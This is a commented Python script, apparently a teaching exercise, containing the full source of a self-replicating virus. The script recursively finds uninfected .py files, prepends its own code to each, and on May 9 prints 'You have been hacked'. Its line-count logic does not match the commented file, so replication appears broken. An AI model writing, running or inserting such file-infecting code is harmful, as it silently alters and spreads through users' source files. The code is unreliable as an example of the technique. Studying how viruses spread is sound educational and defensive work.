# Script Name:                    Malware 
# Author:                         Kevin Williams
# Date of Lastest revision:       12/6/2023
# Purpose:                        Python Malware Analysis
# Additional Sources:             https://chat.openai.com/share/ce115d7d-e41b-40b4-8216-640bc3a79a48

#!/usr/bin/python3
# This line specifies the Python interpreter to be used for executing the script.

import os
import datetime

# Define a constant variable representing the signature of the virus.
SIGNATURE = "VIRUS"

# Function to recursively locate Python files in the specified directory.
def locate(path):
    # List to store targeted files.
    files_targeted = []

    # Get the list of files and directories in the specified path.
    filelist = os.listdir(path)

    # Iterate through the files and directories.
    for fname in filelist:
        # If the item is a directory, recursively call the function on that directory.
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # If the item is a Python file, check if it contains the virus signature.
        elif fname[-3:] == ".py":
            infected = False
            # Check each line of the file for the virus signature.
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If the file is not infected, add it to the list of targeted files.
            if not infected:
                files_targeted.append(path+"/"+fname)
    
    # Return the list of targeted files.
    return files_targeted

# Function to infect the specified files with the virus.
def infect(files_targeted):
    # Open the virus file and read the first 39 lines to get the virus code.
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close

    # Iterate through the targeted files.
    for fname in files_targeted:
        # Open the target file and read its content.
        f = open(fname)
        temp = f.read()
        f.close()

        # Open the target file again in write mode and write the virus code followed by the original content.
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

# Function to check the date and print a message if the current date is May 9th.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locate Python files in the current directory and its subdirectories.
files_targeted = locate(os.path.abspath(""))
# Infect the targeted files with the virus.
infect(files_targeted)
# Check the date and print a message if it's May 9th.
detonate()
